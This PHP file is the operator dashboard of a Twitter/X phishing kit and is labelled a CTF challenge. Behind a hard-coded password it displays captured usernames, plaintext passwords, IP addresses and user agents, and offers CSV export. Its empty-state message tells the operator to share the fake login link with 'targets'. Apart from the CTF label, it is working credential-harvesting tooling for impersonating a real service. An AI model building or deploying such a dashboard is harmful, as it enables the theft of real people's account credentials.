<?php
include 'db.php';

// Simple auth check - change this password
$auth_pass = 'ctfadmin123';

// Check if already authenticated via session
session_start();
if (!isset($_SESSION['view_auth'])) {
    if (isset($_POST['password']) && $_POST['password'] === $auth_pass) {
        $_SESSION['view_auth'] = true;
    } else {
        // Show login form
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Dashboard Login</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: #000;
                    color: #fff;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .login-box {
                    background: #16181c;
                    padding: 40px;
                    border-radius: 16px;
                    text-align: center;
                    max-width: 350px;
                    width: 100%;
                }
                input {
                    width: 100%;
                    padding: 12px;
                    margin: 10px 0;
                    border: 1px solid #333;
                    border-radius: 4px;
                    background: transparent;
                    color: #fff;
                    font-size: 16px;
                    box-sizing: border-box;
                }
                button {
                    width: 100%;
                    padding: 12px;
                    background: #1d9bf0;
                    color: #fff;
                    border: none;
                    border-radius: 9999px;
                    font-size: 15px;
                    font-weight: 700;
                    cursor: pointer;
                    margin-top: 10px;
                }
                h2 { margin-bottom: 20px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>Dashboard Access</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Enter dashboard password" required>
                    <button type="submit">Unlock</button>
                </form>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Fetch captured data
$result = $conn->query("SELECT * FROM twitter_logs ORDER BY id DESC");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Twitter Phishing - Captured Data</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #000;
            color: #fff;
            padding: 40px 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #1d9bf0; margin-bottom: 8px; font-size: 24px; }
        .subtitle { color: #71767b; margin-bottom: 24px; font-size: 14px; }
        .stats {
            display: flex; gap: 16px; margin-bottom: 24px; flex-wrap: wrap;
        }
        .stat-box {
            background: #16181c; padding: 20px; border-radius: 12px; flex: 1;
            min-width: 120px; text-align: center;
        }
        .stat-box .num { font-size: 32px; font-weight: 700; color: #1d9bf0; }
        .stat-box .label { font-size: 12px; color: #71767b; margin-top: 4px; }
        table {
            width: 100%; border-collapse: collapse; background: #16181c;
            border-radius: 12px; overflow: hidden;
        }
        th {
            background: #1d9bf0; color: #fff; padding: 12px 16px;
            text-align: left; font-size: 13px; font-weight: 600;
        }
        td {
            padding: 12px 16px; border-bottom: 1px solid #2f3336;
            font-size: 14px; color: #e7e9ea;
        }
        tr:hover td { background: rgba(29, 155, 240, 0.08); }
        .ip-col { color: #71767b; font-family: monospace; font-size: 12px; }
        .time-col { color: #71767b; font-size: 12px; }
        .logout { color: #1d9bf0; text-decoration: none; font-size: 13px; float: right; margin-top: 10px; }
        .logout:hover { text-decoration: underline; }
        .password-col { color: #f4212e; font-family: monospace; font-weight: 600; }
        .no-data { text-align: center; padding: 40px; color: #71767b; }
        .actions { margin: 16px 0; }
        .actions button {
            background: #16181c; color: #fff; border: 1px solid #333;
            padding: 8px 16px; border-radius: 9999px; cursor: pointer; font-size: 13px;
        }
        .actions button:hover { background: #2f3336; }
        .export-btn { background: #1d9bf0 !important; border-color: #1d9bf0 !important; }
        @media (max-width: 768px) {
            table { font-size: 12px; }
            th, td { padding: 8px 10px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div style="display: flex; justify-content: space-between; align-items: center;">
        <div>
            <h1>🗂 Captured Credentials</h1>
            <p class="subtitle">Twitter/X Phishing Dashboard — CTF Challenge</p>
        </div>
        <a href="logout.php" class="logout">Logout</a>
    </div>

    <?php
    $total = $conn->query("SELECT COUNT(*) as c FROM twitter_logs")->fetch_assoc()['c'];
    $with_pass = $conn->query("SELECT COUNT(*) as c FROM twitter_logs WHERE password IS NOT NULL AND password != ''")->fetch_assoc()['c'];
    $today = $conn->query("SELECT COUNT(*) as c FROM twitter_logs WHERE DATE(captured_at) = CURDATE()")->fetch_assoc()['c'];
    ?>

    <div class="stats">
        <div class="stat-box"><div class="num"><?php echo $total; ?></div><div class="label">Total Attempts</div></div>
        <div class="stat-box"><div class="num"><?php echo $with_pass; ?></div><div class="label">Full Logins</div></div>
        <div class="stat-box"><div class="num"><?php echo $today; ?></div><div class="label">Today</div></div>
    </div>

    <div class="actions">
        <button onclick="location.reload()">🔄 Refresh</button>
        <button class="export-btn" onclick="exportCSV()">📥 Export CSV</button>
        <button onclick="clearData()">🗑 Clear All</button>
    </div>

    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Identifier</th>
                <th>Password</th>
                <th>IP Address</th>
                <th>User Agent</th>
                <th>Captured At</th>
            </tr>
        </thead>
        <tbody>
            <?php if ($result->num_rows > 0): ?>
                <?php while($row = $result->fetch_assoc()): ?>
                <tr>
                    <td><?php echo $row['id']; ?></td>
                    <td><?php echo htmlspecialchars($row['identifier']); ?></td>
                    <td class="password-col"><?php echo $row['password'] ? htmlspecialchars($row['password']) : '<span style="color:#71767b">—</span>'; ?></td>
                    <td class="ip-col"><?php echo htmlspecialchars($row['ip']); ?></td>
                    <td style="font-size:11px; color:#71767b; max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;"><?php echo htmlspecialchars(substr($row['user_agent'], 0, 60)); ?>...</td>
                    <td class="time-col"><?php echo $row['captured_at'] ? $row['captured_at'] : $row['created_at']; ?></td>
                </tr>
                <?php endwhile; ?>
            <?php else: ?>
                <tr><td colspan="6" class="no-data">No data captured yet. Share the login page link with targets.</td></tr>
            <?php endif; ?>
        </tbody>
    </table>
</div>

<script>
function exportCSV() {
    window.location.href = 'export.php';
}

function clearData() {
    if (confirm('Delete ALL captured data?')) {
        window.location.href = 'clear.php';
    }
}
</script>

</body>
</html>